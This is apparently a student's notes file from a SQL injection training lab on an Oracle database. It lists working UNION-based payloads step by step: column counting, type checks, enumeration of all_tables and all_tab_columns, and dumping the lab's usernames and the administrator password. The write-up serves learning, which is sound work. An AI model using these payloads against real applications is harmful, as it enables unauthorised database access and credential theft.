@@ -1,0 +1,45 @@
+Lab: SQL injection attack, listing the database contents on Oracle
+
+Goal
+login in as an administrator
+
+
+SQL injection vulnerability in the product filter.
+union attack to retrive data from other tables
+a table that holds the usernames and passwords
+objective:
+	1 determine the name of this table and columns it contains
+	2 Retrive the contents of the table to obtain the username
+	and password of all users
+
+
+using union attacks
+1. determine the number columns available 
+'+order+by+1-- response 200
+'+order+by+2-- response 200
+'+order+by+3-- response 500
+analysis
+the table has 2 columns
+
+2. Determine the data types of these two columns
+'+UNION+SELECT+'abc',null+FROM+dual-- response 200
+'+UNION+SELECT+'abc','james'+FROM+dual-- response 200
+
+analysis 
+both colums are of strings data types
+
+3. Determine the name of the tables and the columns it contains
+3.1 determining the table name = '+UNION+SELECT+table_name,+NULL+FROM+all_tables-- 
+ANALYSIS
+table name = USERS_CVOYPY
+
+3.2 determining the table columns = '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name+%3d+'USERS_CVOYPY'-- 
+analysis 
+column names = USERNAME_MUQWPT and PASSWORD_GMTGCZ
+
+4 retriving usernames and passwords from USERNAME_MUQWPT
+'+UNION+SELECT+USERNAME_MUQWPT,PASSWORD_GMTGCZ+FROM+USERS_CVOYPY--
+analysis 
+username = administrator
+password = qnf0si6cu5w2zrknta8z
+
